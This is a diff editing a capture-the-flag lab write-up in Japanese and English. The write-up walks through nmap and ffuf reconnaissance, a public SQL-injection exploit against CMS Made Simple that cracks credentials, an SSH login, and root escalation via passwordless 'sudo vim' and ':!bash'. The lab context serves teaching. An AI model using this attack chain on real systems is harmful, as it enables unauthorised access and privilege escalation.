@@ -30,14 +30,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -sV -sT -sC $ip
-```
-
-```
 PORT     STATE SERVICE VERSION
 21/tcp   open  ftp     vsftpd 3.0.3
 80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
@@ -46,11 +42,8 @@ PORT     STATE SERVICE VERSION
 
 補助列挙（Webパス発見）:
 
-```
+```bash
 ffuf -w /home/n0z0/SecLists/Discovery/Web-Content/common.txt -u http://$ip/FUZZ
-```
-
-```
 robots.txt
 /simple
 ```
@@ -66,9 +59,6 @@ SSHで初期シェルを得る流れです。FTP anonymous も有効ですが、
 
 ```
 searchsploit cms made simple 2.2
-```
-
-```
 CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
 ```
 
@@ -78,22 +68,15 @@ CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
 
 ## 2-2. SQLi exploit でユーザ/パスワード情報を取得
 
-```
+```bash
 python3 46635.py -u http://$ip/simple --crack -w ~/thm/rockyou.txt
-```
-
-```
 CMS Made Simple < 2.2.10 Collect authentication information using SQL Injection
 (The original PDF memo only records that the encoding was adjusted and executed due to version differences)
 ```
 
 ## 2-3. SSHでユーザシェル獲得
 
-```
 ssh -p 2222 mitch@$ip
-```
-
-```
 uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)
 
 💡 Why this works  
@@ -112,9 +95,6 @@ You can transition to the root shell by hitting `:!bash` from the command mode o
 id
 sudo -l -l
 sudo vim test.txt
-```
-
-```text
 User mitch may run the following commands on Machine:
 RunAsUsers: root
 Options: !authenticate
@@ -124,15 +104,9 @@ Commands:
 
 Run in `vim`:
 
-```vim
+```
 :!bash
-```
-
-```bash
 id
-```
-
-```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
